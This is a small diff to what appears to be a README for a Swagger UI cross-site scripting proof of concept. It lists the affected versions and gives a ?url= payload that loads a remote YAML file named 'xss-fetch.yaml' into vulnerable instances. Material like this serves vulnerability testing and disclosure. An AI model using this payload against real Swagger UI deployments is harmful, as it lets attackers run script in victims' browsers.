@@ -2,7 +2,7 @@
 
 - Swagger UI version affected: `>=3.14.1 < 3.38.0`
 
-## Payloads
+## Payloads Test
 
 ### `url`
 `?url=https://raw.githubusercontent.com/ClearGate-Int/swagger-UI_xss/main/xss-fetch.yaml`
